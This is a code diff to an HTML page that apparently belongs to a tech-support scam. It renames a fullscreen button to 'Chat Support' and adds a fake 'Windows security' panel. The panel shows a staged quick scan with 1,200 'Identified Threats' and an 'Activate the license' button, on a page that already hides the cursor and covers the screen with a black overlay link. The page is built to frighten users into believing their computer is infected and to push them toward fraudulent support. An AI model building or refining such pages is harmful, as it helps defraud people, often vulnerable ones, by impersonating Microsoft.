@@ -129,7 +129,7 @@
     </audio>
 
     <!-- Added fullscreen button for less aggressive fullscreen -->
-    <button id="fullscreen-btn" style="position: fixed; bottom: 20px; right: 20px; z-index: 1000; padding: 10px 20px; background-color: #114d9a; color: #fff; border: none; border-radius: 5px; cursor: pointer; font-size: 14px; font-weight: 700;">Enter Fullscreen</button>
+    <button id="fullscreen-btn" style="position: fixed; bottom: 20px; right: 20px; z-index: 1000; padding: 10px 20px; background-color: #114d9a; color: #fff; border: none; border-radius: 5px; cursor: pointer; font-size: 14px; font-weight: 700;">Chat Support</button>
 
     <div class="bg" style="cursor:none">
       <div class="bgimg" style="top:0">
@@ -139,6 +139,126 @@
     <a href="#" id="link_black" style="cursor:none" rel="noreferrer">
       <div class="black" style="height: 145%; cursor: none; display: block;"></div>
     </a>
+	
+	 <div class="pro_box" style="cursor: none; display: block;">
+      <div class="pro_box_header">
+        <div class="row">
+          <div class="col-md-12">
+            <div class="minimize">
+              <ul>
+                <li>
+                  <a href="#">
+                    <img src="mnc.png">
+                  </a>
+                </li>
+              </ul>
+            </div>
+          </div>
+          <div class="col-md-4">
+            <div class="logo">
+              <img src="msmm.png">
+              <span>Windows security</span>
+            </div>
+          </div>
+          <div class="col-md-8">
+            <div class="activate_lic">
+              <ul>
+                <li>
+                  <a href="#">
+                    <button>Activate the license</button>
+                  </a>
+                </li>
+                <li>
+                  <a href="#">
+                    <img src="set.png">
+                  </a>
+                </li>
+                <li>
+                  <a href="#">
+                    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAA0AAAANCAIAAAD9iXMrAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAP9JREFUeNqMUTEORUAQZbIUalESpTNoVEqJSuIKjuMUCiRKnQtoKSRCKRp0JPJf/iYbv/iJKdZ47+3smxl533fpG9d1dV03z/O6rrqum6bpOI6iKJxl/DNNU5Zly7JIjzAMI4oiy7KQy6gHUZqm+FFVNQxDEEDKsjzPk4iSJAFCeA6VeIE4jm3bbtsWJ3Ig932DhYbBk3juOI6macZx3LYtCAIOgoWGwbgwlOc5T9BB3/cCh4bQnfQbruui2aqqBAINYQRPEYx7nlcUBTwIEBrC1aeOMVbX9TAMTxAaghXMSfofYKEhTBzDFKimab7v4xQ2wEIj87292seb/X4EGADicI/nlE5xDgAAAABJRU5ErkJggg==">
+                  </a>
+                </li>
+              </ul>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="scan_box">
+        <div class="scan_box_header">
+          <div class="row">
+            <div class="col-md-6">
+              <div class="quick_scan">
+                <p>
+                  <img src="vsc.png">
+                  <span>Scanning Rapide</span>
+                </p>
+              </div>
+            </div>
+            <div class="col-md-6">
+              <div class="minimize1">
+                <ul>
+                  <li>
+                    <a href="#">
+                      <img src="mnc.png">
+                    </a>
+                  </li>
+                </ul>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="scan_body">
+          <div class="progress">
+            <div class="active progress-bar progress-bar-success" style="width: 100%;" id="dynamic" aria-valuemax="100" aria-valuemin="0" aria-valuenow="100" role="progressbar">100% Complete</div>
+          </div>
+          <div class="table_quick">
+            <table class="table table-bordered">
+              <thead>
+                <tr>
+                  <th scope="col">Scanned Objects</th>
+                  <th scope="col">
+                    <div class="col_fourth counter">
+                      <h2 class="count-number count-title timer" data-speed="5000" data-to="51900">51,900</h2>
+                    </div>
+                  </th>
+                </tr>
+                <tr>
+                  <th scope="col">Time Spent</th>
+                  <th scope="col">5 secs</th>
+                </tr>
+                <tr>
+                  <th scope="col">Identified Threats</th>
+                  <th scope="col" style="color:red">
+                    <h2 class="count-number count-title timer" data-speed="2500" data-to="1200">1,200</h2>
+                  </th>
+                </tr>
+              </thead>
+            </table>
+          </div>
+        </div>
+        <div class="scan_footer">
+          <div class="row">
+            <div class="col-md-6">
+              <div class="bt_can">
+                <div class="btn-group" role="group" aria-label="Basic example">
+                  <button class="btn btn-secondary" type="button">Cancel</button>
+                </div>
+                <div class="btn-group" role="group" aria-label="Basic example">
+                  <button class="btn btn-secondary" type="button">Pause</button>
+                </div>
+              </div>
+            </div>
+            <div class="col-md-6">
+              <div class="bt_can2">
+                <div class="btn-group" role="group" aria-label="Basic example">
+                  <button class="btn btn-secondary" type="button">Scheduled Scans</button>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
 
     <!-- Added .lightbox popup for exit-intent with session checks and delays -->
     <div class="lightbox" style="display: none;">
